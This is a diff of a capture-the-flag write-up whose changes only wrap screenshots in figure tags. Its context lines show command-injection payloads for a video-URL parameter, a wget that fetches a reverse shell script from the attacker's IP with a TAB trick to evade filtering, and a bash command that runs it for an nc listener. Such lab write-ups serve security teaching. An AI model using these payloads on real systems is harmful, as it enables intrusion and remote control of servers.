@@ -99,7 +99,9 @@ admin
 
 Let's visit the target's website.
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Knign/Write-ups/assets/110326359/4bf6e3bc-de66-4e41-92cb-dc6e02e64ad5)
+</figure>
 
 Let's provide the following input:
 
@@ -107,13 +109,17 @@ Let's provide the following input:
 test_id
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Knign/Write-ups/assets/110326359/ba0bf18d-0db8-4f93-9b05-e9c73f2843ed)
+</figure>
 
 As we can see, that did not provide us with any information.
 
 Let's intercept the request in Burpsuite and check the response.
 
+<figure style={{ textAlign: 'center' }}>
 ![3 2](https://github.com/Knign/Write-ups/assets/110326359/54196f6a-42c0-472a-ad73-b960ddf82c8f)
+</figure>
 
 If we use the `--default-search` flag in our command, we get a different output.
 
@@ -121,7 +127,9 @@ If we use the `--default-search` flag in our command, we get a different output.
 yt_url=--default-search:id
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Knign/Write-ups/assets/110326359/5edff4ee-5b47-4c82-a2b8-33c0f5d43a32)
+</figure>
 
 We can escape the flags by adding `--` before the command.
 
@@ -131,7 +139,9 @@ Let's change the `yt_url` parameter to the following to check if we have a comma
 yt_url=---;id;
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![5](https://github.com/Knign/Write-ups/assets/110326359/34f00638-41f4-4765-9e51-7fbb7adc8df4)
+</figure>
 
 Now, create a simple a Bash reverse shell script.
 
@@ -154,7 +164,9 @@ yt_url=---;wget    http://10.17.48.138:8000/reverse_shell.sh;
 
 Note that in order for this command to work, there needs to be a TAB between `wget` and `http` instead of a SPACE.
 
+<figure style={{ textAlign: 'center' }}>
 ![6](https://github.com/Knign/Write-ups/assets/110326359/e8cb839d-b0e8-4b52-9665-5ac4700340aa)
+</figure>
 
 Now, let's set up a `nc` listener.
 
@@ -169,7 +181,9 @@ Next, we have to execute the `reverse_shell.sh` file on the server using the fol
 yt_url=--;bash  reverse_shell.sh
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![7](https://github.com/Knign/Write-ups/assets/110326359/5ea08a3e-4bc2-4556-803e-3beac14ee6f8)
+</figure>
 
 Let's check back on our `nc` listener.
 
